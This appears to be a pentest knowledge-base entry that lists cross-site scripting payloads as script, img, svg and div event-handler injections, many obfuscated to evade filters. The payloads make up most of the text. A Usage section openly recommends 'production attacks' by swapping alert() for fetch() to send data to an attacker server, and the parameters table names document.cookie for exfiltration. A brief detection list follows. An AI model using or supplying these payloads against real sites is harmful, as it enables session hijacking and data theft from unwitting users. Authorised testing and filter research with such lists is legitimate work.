---
id: 0cb3f49a-731c-4d37-bdc4-9bd44b810fbe
name: Collection-of-XSS-Payloads
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:41.801279+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xss
  - payloads
  - javascript
validated: true
---

# Collection-of-XSS-Payloads

## Code

```javascript
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

// Svg payload
<svg\fonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

## Description

This code collection provides a variety of XSS payloads categorized by type (basic script tags, image onerror, SVG onload, and div event handlers). These are designed to bypass common filters through encoding (e.g., Unicode, hex), breaking quotes, or using alternative tags. Use them to test web app vulnerabilities for reflected or stored XSS, starting with simple alerts and progressing to obfuscated variants.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'XSS' | Message in alert (customize for PoC or exfil) | 'XSS' or document.cookie |
| String.fromCharCode(88,83,83) | Encoded 'XSS' to evade string filters | 88,83,83 (ASCII for XSS) |
| \u0061lert | Unicode escaped 'alert' | \u0061 for 'a' in alert |

## Usage

Inject these payloads into user inputs like form fields or URL params during web pentesting. For example, in a search box: <script>alert('XSS')</script>. Test in Burp Repeater or browser. For production attacks, replace alert() with fetch() to exfil data to an attacker server. Reference in procedures like [[procedures/XSS-Payload-Injection]] for step-by-step exploitation.

## Detection

- WAF logs showing blocked <script> or onerror patterns.
- Browser dev tools revealing anomalous event handlers or inline scripts.
- CSP violations in HTTP headers.
- Client-side monitoring for unexpected alerts or network requests to unknown domains.

## Related

- [[procedures/XSS-Payload-Injection]]
- [[tools/Burp-Suite]]
